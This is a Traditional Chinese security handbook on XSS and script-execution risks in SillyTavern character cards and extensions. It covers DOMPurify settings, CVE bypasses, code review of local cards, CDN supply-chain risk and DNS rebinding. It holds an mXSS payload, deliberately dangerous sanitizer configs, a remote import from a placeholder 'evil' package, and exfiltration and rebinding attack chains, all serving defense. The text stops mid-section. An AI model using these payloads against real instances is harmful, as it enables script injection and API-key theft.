# 角色卡安全與 XSS 防護

> 文件版本：v1.0.0 ｜ 最後更新：2026-07-14

> 定位：SillyTavern 角色卡開發者與高階使用者的安全參考手冊。覆蓋渲染管線 XSS 風險、DOMPurify 配置與繞過、卡內 JS 執行向量、本地成熟卡安全實戰，以及使用者側自保方案。

---

## 置信度分級體系

**三級分類**
- **high**：多源交叉或執行時原始碼直接確認，可作為施工依據
- **medium**：單源或合理推斷，可作參考但勿單獨作為施工依據
- **low**：孤證、無獨立來源，**禁止基於此施工**

**依據型別軸**：`[執行時原始碼]` / `[真機]` / `[文件·多源]` / `[文件·單源]` / `[社群]` / `[推斷]`

**收集日期**：2026-06-28
**回源基準**：SillyTavern v1.14.0 + 本地成熟卡（卡A 2.5.0 / 卡B 2.6.0）

---

## 目錄

1. 渲染管線與整體機制
   - 1.1 ST 訊息渲染管線
   - 1.2 角色卡資料格式
2. DOMPurify 淨化範圍與已知繞過
   - 2.1 ST 的 DOMPurify 配置
   - 2.2 預設保護範圍
   - 2.3 已確認 CVE 繞過
   - 2.4 配置誤用導致繞過
   - 2.5 ADD_TAGS + MathML 組合風險
3. 卡內 JS 執行風險面
   - 3.1 正則擴充套件（Regex Extension）
   - 3.2 STScript `/run`
   - 3.3 Code Runner 擴充套件
   - 3.4 `import()` 遠端 ESM
   - 3.5 iframe 使用
4. 本地生產卡安全實戰程式碼解析
   - 4.1 正確做法：`escapeHtml()` 統一轉義
   - 4.2 正確做法：`textContent` / `style.textContent` 安全路徑
   - 4.3 風險點：未轉義路徑
5. PNG 內嵌指令碼風險
6. 第三方 CDN import 風險
7. CSP 現狀
8. DNS 重繫結攻擊（CVE-2025-59159）
9. 關鍵 API 參考表
10. 完整可用正規化程式碼
11. 高頻避坑清單
12. 懸案（A/D 仍需真機驗證；B/C/E 已解除）
13. 使用者側自保方案
14. 來源彙總

---

## 1. 渲染管線與整體機制

### 1.1 ST 訊息渲染管線

**核心結論**

ST 的渲染鏈為：

```
LLM 輸出
  → 正則擴充套件（Regex Extension）替換     ← 先於 Markdown 轉換
  → Showdown（Markdown → HTML）
  → DOMPurify.sanitize()
  → innerHTML 插入 DOM
```

> **注意**：正則擴充套件替換髮生在 Showdown 之**前**（即處理的是原始 Markdown 字串，而非 HTML）。擴充套件 hook（MESSAGE_RECEIVED）在訊息寫入 DOM **後**觸發，此時 DOMPurify 已完成淨化；但 hook 內若再次直接操作 DOM（如 jQuery `.html()`），其內容不再經過 DOMPurify。`renderExtensionTemplateAsync()` 內建 DOMPurify 淨化，是擴充套件模板的安全渲染入口。

| 階段 | 是否 XSS 淨化 | 備註 |
|---|---|---|
| 正則擴充套件替換 | 否 | 在原始 Markdown 上操作，替換字串可含任意文字 |
| Showdown Markdown 轉 HTML | 否 | 僅語法轉換 |
| DOMPurify.sanitize() | 是 | 最終淨化關卡 |
| 擴充套件 hook（MESSAGE_RECEIVED）後續 DOM 寫入 | 否 | 若 hook 內再次 .html() 寫入則繞過淨化 |
| `renderExtensionTemplateAsync()` | 是 | 內建淨化，推薦用於模板 |

來源：ST 1.14.0 `public/script.js` 第 1674 行（`getRegexedString` 呼叫）→ 第 1745 行（`converter.makeHtml`）→ 第 1773 行（`DOMPurify.sanitize`）[執行時原始碼]；ST 官方擴充套件文件 https://docs.sillytavern.app/for-contributors/writing-extensions/ [文件·多源]
適用版本：ST 1.14.0（原始碼直讀）
**置信度：high · [執行時原始碼]**

### 1.2 角色卡資料格式

**核心結論**

PNG 角色卡透過 tEXt chunk 儲存 JSON（欄位 `chara`）或 CHARX（ZIP 內 JSON + 資產）。欄位內容（角色描述、示例對話、世界書條目）均為純文字，注入 LLM 提示詞，**不在前端直接渲染為 HTML**。ST 載入時僅解析 JSON，不執行欄位內容。

正則指令碼（`data.extensions.regex`）和快捷回覆（Quick Reply）在卡匯入時由 ST 顯式彈框提示使用者確認，確認後才生效。

來源：CCv3 規範 https://github.com/kwaroran/character-card-spec-v3
適用版本：ST 1.x（支援 CCv3 起）
**置信度：high · [文件·多源]**

---

## 2. DOMPurify 淨化範圍與已知繞過

### 2.1 ST 的 DOMPurify 配置

**核心結論**

ST 1.14.0 的 `messageFormatting()`（`public/script.js`）呼叫 `DOMPurify.sanitize(mes, config)`，config 中：
- `ADD_TAGS: ['custom-style']`（**僅此一個自定義標籤**，不含 `now_plot`、`world_situation` 等）
- `MESSAGE_SANITIZE: true`（自定義標誌位，用於 hook 內判斷是否處於訊息淨化模式）

透過 `addDOMPurifyHooks()`（`public/scripts/chats.js`）註冊兩個 hook：
1. `uponSanitizeAttribute`：`MESSAGE_SANITIZE` 模式下，將 class 值中的自定義類名加 `custom-` 字首（防止類名與 ST 內部類衝突）
2. `uponSanitizeElement`：`MESSAGE_SANITIZE` 模式下，將 `HTMLUnknownElement` 內的文字換行符轉為 `<br>` 元素；外部媒體被停用時，遮蔽 img/audio/video/embed/object 等媒體元素的外鏈 src

`<style>` 標籤透過 `encodeStyleTags()` 先編碼為 `<custom-style>%URL_ENCODED%</custom-style>`，經 DOMPurify 保留，再由 `decodeStyleTags()` 解碼並用 `@adobe/css-tools` 解析選擇器加字首（作用域隔離）。

> 草稿原說 ADD_TAGS 含 `now_plot`、`world_situation` 等，原始碼中不存在，已更正。

來源：ST 1.14.0 `public/script.js` 第 1764–1773 行、`public/scripts/chats.js` 第 1906–1977 行 [執行時原始碼]
適用版本：ST 1.14.0（原始碼直讀）
**置信度：high · [執行時原始碼]**

### 2.2 預設保護範圍

**核心結論**

DOMPurify 預設淨化範圍（無需額外配置即生效）：

| 淨化物件 | 說明 |
|---|---|
| `<script>` 標籤 | 移除 |
| `<style>` 內 `expression()` | 移除 |
| `<object>`、`<embed>` | 移除 |
| 所有事件屬性 `onclick`、`onerror`、`onload` 等 | 移除 |
| `javascript:` URI | 移除 |
| `data:` URI | 預設停用（ALLOW_DATA_ATTR 關閉） |

來源：DOMPurify 官方文件（多源交叉）
適用版本：DOMPurify 2.x / 3.x
**置信度：high · [文件·多源]**

### 2.3 已確認 CVE 繞過

**核心結論**

| CVE | 影響版本 | 攻擊機制 | 修復版本 |
|---|---|---|---|
| CVE-2024-47875 | < 2.5.0 / < 3.1.3 | 深層巢狀 mXSS（math/svg/foreignObject/iframe） | 2.5.0 / 3.1.3（限制巢狀深度 500） |
| CVE-2025-26791 | < 3.2.4 | `SAFE_FOR_TEMPLATES=true` + 模板字面量正則錯誤 → mXSS | 3.2.4 |

**CVE-2024-47875 觸發 payload**：

```html
<math><annotation-xml encoding="application/xhtml+xml"><svg><foreignObject>
  <iframe srcdoc="<img src=x onerror=alert('xss')>" />
</foreignObject></svg></annotation-xml></math>
```

**CVE-2025-26791 觸發條件**：需啟用 `SAFE_FOR_TEMPLATES: true`。ST 1.14.0 預設配置中**不含此選項**（已從原始碼確認，原懸案 C 已解除），且 DOMPurify 版本為 3.2.6 已修復，ST 1.14.0 不受此 CVE 影響。

來源：
- CVE-2024-47875：https://www.cve.news/cve-2024-47875/
- CVE-2025-26791：https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251
- PortSwigger mXSS 研究：https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

適用版本：DOMPurify < 3.2.4
**置信度：high · [文件·多源]**

### 2.4 配置誤用導致繞過

**核心結論**

以下任何一種配置都會實質性降低 DOMPurify 保護等級：

```javascript
// 危險：允許事件處理器屬性
DOMPurify.sanitize(input, { ADD_ATTR: ['onerror', 'onload'] });

// 危險：允許 script/noscript 標籤
DOMPurify.sanitize(input, { ADD_TAGS: ['script'] });

// 危險：寬鬆 URI 白名單（允許 javascript: 協議）
DOMPurify.sanitize(input, { ALLOWED_URI_REGEXP: /.*/ });

// 危險：hook 中 forceKeepAttr = true（跳過正則過濾）
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  data.forceKeepAttr = true;
});

// 危險：hook 中 .setAttribute() 直接寫入屬性（繞過淨化迴圈）
DOMPurify.addHook('afterSanitizeAttributes', node => {
  node.setAttribute('onmouseover', 'alert(1)'); // 新屬性不再被掃描
});
```

**字串後處理陷阱**：淨化後對結果字串做 replace 操作可能重構危險標籤。例：Unicode 規範化 `ß → SS` 可重建 `</style>` 標籤。正確做法：淨化結果直接寫入 DOM，不再做字串變換。

來源：DOMPurify 配置誤用分析 https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations
適用版本：DOMPurify 全版本（配置層面問題）
**置信度：high · [文件·多源]**

### 2.5 ADD_TAGS + MathML 組合風險

**核心結論**

> **ST 1.14.0 預設配置不受此風險影響**：原始碼確認 `ADD_TAGS` 僅含 `['custom-style']`，不含任何 MathML 標籤（見 2.1 節），且 DOMPurify 版本為 3.2.6（已修復相關 CVE）。

理論上：若擴充套件開發者將 MathML 相關標籤（`math`、`mtext`、`mglyph` 等）加入 `ADD_TAGS`，則舊版 DOMPurify（< 2.1）的 PortSwigger mXSS 向量（Chrome/Firefox 雙向量）可被觸發。此為**非預設場景的擴充套件開發者風險提示**，不適用於 ST 1.14.0 預設配置。

來源：PortSwigger mXSS 研究（單源）[文件·單源]；ADD_TAGS 現狀來自 ST 1.14.0 原始碼 [執行時原始碼]
適用版本：僅當擴充套件/第三方配置手動加入 MathML 到 ADD_TAGS 時才相關
**置信度：medium · 推導未驗證**（MathML + ADD_TAGS 組合場景為假設條件，ST 預設配置不觸發）

---

## 3. 卡內 JS 執行風險面

### 3.1 正則擴充套件（Regex Extension）— 最大風險面

**核心結論**

正則替換的"Replace String"欄位輸出經完整 DOMPurify 管線淨化，但：

- **替換字串可含 HTML**：關閉"Show `<tags>` in responses"後，`<div>`/`<span>`/CSS 注入為設計功能
- 淨化前不存在針對替換字串的專項 XSS 過濾，完全依賴 DOMPurify 預設 config
- **惡意卡風險**：若 DOMPurify 版本 < 3.1.3，正則替換 payload 中的 mXSS 向量（CVE-2024-47875）可能繞過
- 正則指令碼隨卡匯入時 ST 彈框提示使用者確認，使用者點選"確認"後即生效
- 精心構造的正則替換可輸出 `<button data-xy-action="...">` 類元素，觸發 ST 內部 action handler（見第 11 節避坑 10）

來源：ST 官方正則文件 https://docs.sillytavern.app/extensions/regex/
適用版本：ST 1.x
**置信度：medium · [文件·多源]**

### 3.2 STScript `/run` — 受控執行

**核心結論**

STScript 不直接執行 JavaScript，在受控斜槓命令框架內執行。`/run` 只能呼叫 Quick Reply 標籤名，無法任意執行程式碼。

**實際可做的（惡意利用）**：
- `/gen`、`/genraw`：向 LLM API 發起請求，消耗 token
- `/trigger`：操控生成流
- 呼叫第三方擴充套件命令（圖片生成、TTS）造成資源濫用

**不能做的**：直接訪問檔案系統、執行系統命令、執行任意 JavaScript。

來源：STScript 文件 https://docs.sillytavern.app/usage/st-script/
適用版本：ST 1.x
**置信度：medium · [文件·多源]**（STScript 不執行 JS 是文件級保證，但"可做"的惡意利用清單未經真機驗證；`/run` 僅調 QR 名是文件明確約束）

### 3.3 Code Runner 擴充套件 — 高風險可選功能

**核心結論**

官方第三方擴充套件，允許從聊天 code block 執行：
- ` ```js ` → 透過 SandboxJS 沙盒執行 JavaScript
- ` ```stscript ` → 執行 STScript

**官方原話**："please don't run anything that looks too sussy"（官方承認沙盒非防彈級別）。

若啟用此擴充套件，惡意卡透過正常 Markdown 程式碼塊觸發 JS 執行，沙盒逃逸風險不可排除。

來源：Code Runner 擴充套件 https://github.com/SillyTavern/Extension-CodeRunner（執行時原始碼）
適用版本：ST 1.x + Code Runner 擴充套件
**置信度：high · [執行時原始碼]**

### 3.4 `import()` 遠端 ESM — 供應鏈風險

**核心結論**

> **版本說明**：`importFromUrl()` 輔助函式在 ST **1.14.0** 的 `public/scripts/` 目錄中**不存在**（已逐檔案搜尋確認）。該函式可能存在於更高版本或第三方擴充套件中，具體引入版本需進一步核查。

瀏覽器原生 `import(url)` 加上 webpack `/* webpackIgnore: true */` 註釋，可繞過 webpack 捆綁直接從任意 URL 動態載入 ES 模組——這是 JS 執行環境的能力，任何能執行 JS 的擴充套件/卡內指令碼均可使用：

```javascript
// 擴充套件程式碼中的供應鏈風險用法
const module = await import(/* webpackIgnore: true */ 'https://cdn.jsdelivr.net/npm/evil@latest/index.js');
```

**風險鏈路**：擴充套件或卡內 JS 從 CDN/使用者控制 URL 載入模組 → 供應鏈劫持（CDN 被汙染、URL 被重定向）→ 任意程式碼執行。

**注意**：正則/世界書/卡片正文不能直接執行 JS，需透過擴充套件程式碼才能觸發此路徑。

來源：動態 `import()` 是 Web 標準能力，ST 擴充套件開發文件 [文件·多源]；`importFromUrl` 函式本身在 v1.14.0 中未找到 [執行時原始碼查詢結果]
適用版本：ST 1.x（凡能執行擴充套件 JS 的版本均受影響）
**置信度：medium · 單源孤證**（`importFromUrl` 函式存在性未從 v1.14.0 原始碼確認；動態 import 能力本身 high）

### 3.5 iframe 使用（本地生產卡實戰）

**核心結論**

卡A/卡B卡使用 `window.frameElement`、`window.parent` 跨 iframe 通訊（讀取父框架 `CrossedZoneMediaLibrary`、`XingyueHudSettings` 等全域性變數），這是 ST 渲染 HTML 世界書條目的正常機制（Tavern Helper/ST 將 HTML 渲染在 iframe 中）。

**安全觀察**：
- iframe 內的指令碼可透過 `window.parent` 讀取父頁面全域性狀態（如 ST 內部物件）
- 惡意卡若能將任意 HTML 渲染進 iframe，即可透過 `window.parent.SillyTavern.getContext()` 讀取聊天記錄、API 配置
- ST 本身對 iframe 內指令碼是否設定 `sandbox` 屬性為懸案（見第 12 節懸案 D）

來源：本地生產卡原始碼 `<local-guide-db>\本地證據\卡A歷史\2.9.1\components\status_bar_regex.html`（執行時原始碼）
適用版本：卡A 2.9.1 / 卡B 1.9.x
**置信度：high · [執行時原始碼]**

---

## 4. 本地生產卡安全實戰程式碼解析

### 4.1 正確做法：`escapeHtml()` 統一轉義

**核心結論**

`control_center.js`（第 1581 行）中定義並全域性使用：

```javascript
function escapeHtml(value) {
  return String(value ?? '').replace(/[&<>"']/g, ch => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  }[ch]));
}
```

所有動態 HTML 拼接均透過 `escapeHtml()` 處理使用者/LLM 資料（覆蓋按鈕文字、data 屬性、pre 標籤內容等），模式一致。這是正確的防護正規化。

來源：`<local-guide-db>\本地證據\卡A歷史\2.9.1\components\control_center.js` 第 1581 行（執行時原始碼）
適用版本：卡A 2.5.0+ / 卡B 2.6.0+
**置信度：high · [執行時原始碼]**

### 4.2 正確做法：`textContent` / `style.textContent` 安全路徑

**核心結論**

`omni_safe_block_renderer.js`（第 76 行）中：

```javascript
body.textContent = String(content || '').trim(); // 永遠安全，無 XSS 面
```

CSS 注入透過 `style.textContent = css;` 而非 `style.innerHTML`，同樣安全。

來源：`<local-user-path>/<local-drive>\<local-workspace>\卡B\v1.9.3_20260526_002904\components\omni_safe_block_renderer.js` 第 76 行（執行時原始碼）
適用版本：卡B 1.9.3+
**置信度：high · [執行時原始碼]**

### 4.3 風險點：未轉義路徑

**核心結論**

`status_bar_regex.html` 中存在以下未轉義拼接模式：

**`htmlField()` 未轉義**（第 2486-2503 行）：

```javascript
function htmlField(label, val) {
  // displayValue 返回普通字串，無 HTML 轉義
  return '<div class="char-field"><span class="char-field-label">' + label +
         '</span><span class="char-field-value">' + displayValue(val, '--') + '</span></div>';
}
```

**實際使用中的直接拼接**（第 2878-2881 行）：

```javascript
if (v['推測Tier強度']) html += '<span class="badge" ...>' + v['推測Tier強度'] + '</span>';
if (v['等級'])        html += '<span class="badge" ...>Lv ' + v['等級'] + '</span>';
if (v['HP'])          html += '<span class="badge" ...>HP ' + v['HP'] + '</span>';
```

LLM 輸出的變數值（如 `v['等級']`）直接拼入 innerHTML，未經轉義。

**實際威脅評估**：這些變數來自 ST `getVariables()`，其值由 LLM 寫入，理論上可包含 HTML。根據原始碼分析（見第 12 章懸案 A 說明），jQuery `.html()` 寫入發生在 DOMPurify 淨化**之後**，悲觀派立場更有支撐——即 LLM 注入的 HTML 字元可能直接執行。仍需真機驗證最終效果。

**`attrValue()` 做了屬性轉義但不完整**（第 2126 行）：

```javascript
function attrValue(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
  // 注：缺少 > 和 ' 的轉義，但 HTML attribute 上下文基本夠用
}
```

**`cssValue()` 過濾不完整**（第 2134 行）：

```javascript
function cssValue(value) {
  return String(value == null ? '' : value).replace(/[;"'<>]/g, '');
  // 用於 style="--cz-media-fallback-color:..." 插值
  // 未過濾 url()、expression()、var() 等 CSS 注入向量
}
```

來源：`<local-guide-db>\本地證據\卡A歷史\2.9.1\components\status_bar_regex.html`（執行時原始碼）
適用版本：卡A 2.9.1
**置信度：high · [執行時原始碼]**

---

## 5. PNG 內嵌指令碼風險

**核心結論**

PNG 角色卡的 tEXt chunk 儲存的 JSON 欄位內容是純文字字串，不是可執行程式碼。載入時 ST 僅解析 JSON，不執行任何欄位內容。

**真實威脅面（由高到低）**：

| 威脅 | 觸發條件 | 使用者提示 |
|---|---|---|
| HTML 世界書條目（卡內 iframe） | Tavern Helper 渲染為 iframe HTML | 無單獨提示（隨卡整體匯入） |
| 內嵌正則指令碼（`data.extensions.regex`） | 卡匯入時 | 有彈框確認 |
| Quick Reply 嵌入內容 | 卡匯入時 | 有彈框確認 |
| 偽裝成描述文字的 STScript 指令 | 使用者點選惡意按鈕時 | 無（依賴使用者不點選） |

**檢查工具**：https://github.com/Barafu/tavern_card_tools（命令列列印 PNG 內 JSON 內容）

來源：CCv3 規範 + 本地原始碼審查
適用版本：ST 1.x（支援 CCv3 起）
**置信度：medium · [文件·多源]**

---

## 6. 第三方 CDN import 風險

**核心結論**

已發生真實事件：Bot Browser 擴充套件（2024-2025）透過 ST 1.17 以前的備份系統漏洞外洩 API key，導致使用者賬號餘額被清空。

**風險鏈路**：

```
惡意擴充套件/卡
  → import(CDN_URL)（importFromUrl 或直接 dynamic import）
  → 惡意 ES 模組載入執行
  → 讀取 extensionSettings（含所有擴充套件配置，明文儲存）
  → fetch() 外洩到攻擊者伺服器
  → API key 洩露 → 賬號盜刷
```

**可訪問資料**：

| 資料 | 訪問方式 | 風險級別 |
|---|---|---|
| `extensionSettings` | `getContext().extensionSettings` | 高（含 API 配置） |
| 角色卡資料 | `getContext().characters` | 中 |
| 聊天記錄 | `getContext().chat` | 中 |
| DOM 中渲染的 API key 輸入框 | `document.querySelector(...)` | 高 |

**官方警告**："Never store API keys in extensionSettings"——任何有讀取 `getContext()` 能力的擴充套件/卡均可訪問 extensionSettings。

**CDN 供應鏈具體風險**：
- `import('https://cdn.jsdelivr.net/npm/xxx@latest/index.js')` → latest tag 被劫持
- `@unpkg` / `@esm.sh` 的惡意包 → 動態 import 後立即執行資料外洩

來源：ST 官方安全討論 https://github.com/SillyTavern/SillyTavern/discussions/5592（社群·真實事件）
適用版本：ST < 1.17.0（備份漏洞已修復）；CDN import 風險持續存在
**置信度：high · [文件·多源]**

---

## 7. CSP 現狀

**核心結論（推斷）**

官方文件和 DeepWiki 均未提及 ST 設定 Content-Security-Policy 響應頭。ST 服務端（Node.js/Express）的安全機制集中在：IP 白名單、Host Header 驗證（hostWhitelist，預設關閉）、CSRF double-submit token、基礎認證。

**推斷：ST 當前未設定嚴格 CSP。**

缺少 CSP 的實際影響：

| CSP 指令 | 缺失影響 |
|---|---|
| `script-src` | inline script 和動態 `import()` 均可執行 |
| `connect-src` | `fetch()` 可向任意外部域發請求 |
| `frame-src` | 卡內 iframe 可載入任意內容 |

**若要自行新增 CSP**（使用者側加固方案，注意 ST 本體大量使用內聯指令碼，嚴格 CSP 會破壞功能）：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  connect-src 'self' https://your-api-endpoint;
  frame-src 'self';
  img-src 'self' data: blob: https:;
  style-src 'self' 'unsafe-inline';
```

嚴格 CSP 需要 nonce 方案配合，直接新增上述規則會破壞 ST 功能。真機驗證路徑：在 ST Express server 中介軟體加 `res.setHeader('Content-Security-Policy', ...)` 逐步觀察。

來源：ST 服務端原始碼（推斷）+ 通用 Web 安全規範
適用版本：ST 1.x
**置信度：medium · [推斷]**

---

## 8. DNS 重繫結攻擊（CVE-2025-59159）

**核心結論**

CVSS **9.6**（官方安全公告值；第三方媒體報道有標 9.7 的誤差），影響 ST ≤ 1.13.3，1.13.4 修復（引入 hostWhitelist，**預設關閉**）。

**攻擊鏈**：

```
1. 攻擊者註冊域名，TTL 設極短（< 60s）
2. 受害者訪問惡意頁面
3. JS payload 等待 DNS rebind（域名解析切換到 127.0.0.1）
4. 同源策略被繞過，JS 直接呼叫本地 ST API
5. 安裝惡意擴充套件 → 任意程式碼執行
   讀取聊天/API key → 資料外洩
   注入釣魚 HTML → 社會工程
```

**防護配置**（`config.yaml`）：

```yaml
hostWhitelist:
  enabled: true
  whitelist:
    - localhost
    - 127.0.0.1
    - "::1"
```

**重要**：即使已更新到 ≥ 1.13.4，hostWhitelist 預設關閉，使用者必須手動開啟。

來源：
- ST 安全公告 https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-7cxj-w27x-x78q
- CVE-2025-59159 詳情 https://securityonline.info/critical-flaw-cve-2025-59159-cvss-9-7-in-sillytavern-allows-full-remote-control-of-local-ai-instances/

適用版本：ST ≤ 1.13.3（高危）；≥ 1.13.4 但未開 hostWhitelist（中危）
**置信度：high · [文件·多源]**

---

## 9. 關鍵 API 參考表

| API / 欄位 | 作用 | 安全級別 | 備註 |
|---|---|---|---|
| `DOMPurify.sanitize(html)` | XSS 淨化，預設配置 | 安全 | 需保持庫版本 ≥ 3.2.4 |
| `DOMPurify.sanitize(html, {ADD_TAGS:[...]})` | 允許額外標籤 | 有條件安全 | ADD_TAGS 含 MathML 時風險升高 |
| `DOMPurify.sanitize(html, {ADD_ATTR:['onerror']})` | 允許事件屬性 | 危險 | 直接繞過淨化 |
| `element.textContent = val` | 純文字寫入 | 安全 | 永不 XSS，推薦首選 |
| `element.innerHTML = val` | HTML 寫入 | 危險 | 必須先經 DOMPurify 或 escapeHtml |
| `style.textContent = css` | CSS 安全注入 | 安全 | 不解析 HTML |
| `style.innerHTML = css` | CSS 不安全注入 | 有風險 | 避免使用 |
| `import(/* webpackIgnore: true */ url)` | 遠端 ESM 載入 | 高危 | 無域名限制，供應鏈風險 |
| `renderExtensionTemplateAsync()` | 擴充套件模板渲染 | 安全 | 內建 DOMPurify，推薦 |
| `SillyTavern.libs.DOMPurify` | 訪問 ST 內建 DOMPurify | 推薦方式 | 避免版本不一致 |
| `window.parent.CrossedZoneHudSettings` | 跨 iframe 訪問父全域性變數 | 有風險 | 惡意 iframe 可讀父頁面狀態 |
| `getContext().extensionSettings` | 讀取所有擴充套件配置 | 高風險資料 | 含明文 API 相關配置，勿存 key |

---

## 10. 完整可用正規化程式碼

### 10.1 卡內安全 HTML 拼接模式（生產級）

```javascript
// 來自 control_center.js:1581 — 生產驗證
function escapeHtml(value) {
  return String(value ?? '').replace(/[&<>"']/g, ch => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  }[ch]));
}

// 正確：LLM/使用者資料經轉義後拼入 innerHTML
element.innerHTML = '<div class="badge">' + escapeHtml(v['等級']) + '</div>';

// 錯誤（生產卡已存在）：未轉義直接拼接 — XSS 風險
element.innerHTML = '<div class="badge">' + v['等級'] + '</div>';
```

### 10.2 安全 DOM 構建（避免字串拼接）

```javascript
// 來自 omni_safe_block_renderer.js — 生產驗證
const body = document.createElement('div');
body.textContent = String(content || '').trim(); // 零 XSS 面

// CSS 安全注入
const style = document.createElement('style');
style.textContent = cssString; // 不是 style.innerHTML
document.head.appendChild(style);
```

### 10.3 DOMPurify 在擴充套件中的標準用法

```javascript
// 官方推薦模式
const { DOMPurify } = SillyTavern.libs;

// 預設配置（最安全）
const clean = DOMPurify.sanitize(userHtml);

// 允許自定義標籤（ST 1.14.0 內部僅用 'custom-style'；如擴充套件需要其他標籤可按需新增）
const clean = DOMPurify.sanitize(userHtml, {
  ADD_TAGS: ['custom-style'],  // ST 1.14.0 原始碼實際值；勿隨意新增 MathML 等高風險標籤
  // 絕對不加 ADD_ATTR: ['onerror'] 等事件屬性
});

// 寫入 DOM
element.innerHTML = clean;
```

### 10.4 CSS 值插值安全處理（增強版）

```javascript
// 現有卡的 cssValue（不足，缺少 url()/expression() 過濾）
function cssValue(value) {
  return String(value ?? '').replace(/[;"'<>]/g, '');
}

// 更安全的 CSS 屬性值處理（推薦替換）
function safeCssValue(value) {
  return String(value ?? '')
    .replace(/url\s*\(/gi, '')        // 禁止 url() CSS 注入
    .replace(/expression\s*\(/gi, '') // 禁止 IE expression
    .replace(/[;"'<>\\]/g, '');       // 移除基本危險字元
}

// 使用：style="--my-color:${safeCssValue(colorFromLLM)}"
```

### 10.5 卡內 fetch 安全白名單模式

```javascript
// 限制 fetch 目標域，防止意外資料外洩
const ALLOWED_ORIGINS = ['https://your-gateway.example.com'];

async function safeFetch(url, options) {
  const parsed = new URL(url);
  if (!ALLOWED_ORIGINS.includes(parsed.origin)) {
    throw new Error('不允許的外部請求: ' + parsed.origin);
  }
  return fetch(url, { credentials: 'include', ...options });
}
```

---

## 11. 高頻避坑清單

1. **`innerHTML = LLM值`，不經任何轉義**（高危）
   LLM 輸出可能包含 `<img src=x onerror=...>`。本地生產卡 `status_bar_regex.html` 中存在此模式（見第 4.3 節）。
   修復：改用 `escapeHtml(val)` 包裹，或改用 `textContent`。

2. **DOMPurify 版本過舊**（高危）
   < 3.1.3 受 CVE-2024-47875（mXSS math/svg 巢狀）影響。ST 內建 DOMPurify 版本需單獨確認（在 ST `public/lib.js` 中搜索版本字串）。

3. **`ADD_ATTR` 包含事件屬性**（極危）
   任何 `onerror`/`onload`/`onclick` 加入 ADD_ATTR → 直接 XSS，無需複雜向量。

4. **淨化後對字串做 replace 操作**（高危）
   可重構危險標籤（如 Unicode 規範化攻擊）。正確做法：淨化結果直接寫入 DOM，不再做字串變換。

5. **hook 中 `node.setAttribute()` 寫入屬性**（高危）
   繞過淨化迴圈，新寫入的屬性不被 DOMPurify 再次掃描。

6. **`importFromUrl()` 使用外部 CDN 且無完整性校驗**（高危）
   無 SRI（Subresource Integrity）保護。推薦只 import `'self'` 域名下的模組，或加 integrity 驗證。

7. **`extensionSettings` 明文儲存金鑰**（高危）
   官方明確警告。任何有讀取 `getContext()` 能力的擴充套件/卡均可訪問。金鑰應由使用者在 ST 介面輸入，不應存入 extensionSettings。

8. **hostWhitelist 預設關閉**（高危）
   DNS 重繫結攻擊（CVE-2025-59159）對所有不開 hostWhitelist 的例項均有效，即使 ST 版本已 ≥ 1.13.4。使用者必須手動在 `config.yaml` 開啟。

9. **第三方擴充套件無沙盒**（高危）
   擴充套件執行在完整 DOM 上下文，可讀寫任何頁面元素。Code Runner 擴充套件的"沙盒"非防彈（開發者原話），啟用需完全信任來源。

10. **正則指令碼含巢狀 data 屬性 + 事件繫結**（中危）
    正則替換可輸出 `<button data-xy-action="...">` 類元素，ST 內部 JS 會響應這些 data 屬性執行內部 action handler。惡意卡可透過精心構造的正則替換觸發意外操作。

---

## 12. 懸案（A/D 仍需真機驗證；B/C/E 已解除）

### 懸案 A：`status_bar_regex.html` 的渲染點是否在 DOMPurify 之前？

**結論傾向（原始碼佐證，悲觀派立場更有支撐）**

ST 1.14.0 原始碼（`public/script.js` 第 3441 行）：
```javascript
await eventSource.emit(event_types.MESSAGE_RECEIVED, this.messageId, this.type);
```
此 emit 在 `addCopyToCodeBlocks` 等 DOM 操作**之後**發生，意味著 `MESSAGE_RECEIVED` 鉤子觸發時，DOMPurify 淨化已完成、訊息 HTML 已寫入 DOM。

**因此**：`status_bar_regex.html` 若透過 `MESSAGE_RECEIVED` 鉤子觸發渲染，其 jQuery `.html(v['等級'])` 呼叫發生在 DOMPurify **之後**，LLM 寫入的變數值不經任何淨化直接注入 DOM——**悲觀派成立**。

**仍需真機驗證**：ST 變數值寫入鏈路（`getVariables()` → 變數 dict → 渲染函式）中是否存在其他隱式轉義；以及是否有瀏覽器 Content-Security-Policy 兜底（見第 7 章）。

**建議修復**：`status_bar_regex.html` 中所有直接拼接 `v['欄位名']` 的位置均應改用 `escapeHtml()`（參見 4.1 節的 `control_center.js` 正規化）。

**驗證路徑**：
1. 構造一個 LLM 會寫入 `v['等級'] = '<img src=x onerror="alert(1)">'` 的角色卡
2. 在 ST 真機中觀察是否彈出 alert
3. 或在 ST console 中：`document.querySelector('.badge').innerHTML`（如果是 img 元素則 XSS 成功）

### ~~懸案 B：ST 內建 DOMPurify 版本~~（已解除）

**已確認**：ST 1.14.0 的 `node_modules/dompurify/package.json` 版本欄位為 **3.2.6**，高於修復 CVE-2024-47875 的 3.1.3 和修復 CVE-2025-26791 的 3.2.4，兩個 CVE 均已修復。

來源：`<local-user-path>/<local-drive>\SillyTavern-1.14.0\node_modules\dompurify\package.json` 第 144 行 [執行時原始碼]

### ~~懸案 C：DOMPurify 的 `SAFE_FOR_TEMPLATES` 是否啟用~~（已解除）

**已確認**：ST 1.14.0 `messageFormatting` 中的 DOMPurify config 物件（`public/script.js` 第 1764–1771 行）不含 `SAFE_FOR_TEMPLATES` 欄位。此外，DOMPurify 版本已是 3.2.6（高於修復版本 3.2.4），CVE-2025-26791 不適用於 ST 1.14.0。

來源：ST 1.14.0 `public/script.js` 第 1764–1771 行；`node_modules/dompurify/package.json` [執行時原始碼]

### 懸案 D：卡內 iframe 的 `sandbox` 屬性

**問題**：ST/Tavern Helper 在渲染卡內 HTML 為 iframe 時，是否設定了 `sandbox` 屬性限制？若無 `sandbox`（或 sandbox 包含 `allow-scripts`），iframe 內 JS 完整執行，可透過 `window.parent` 訪問父頁面。

**兩派立場**：
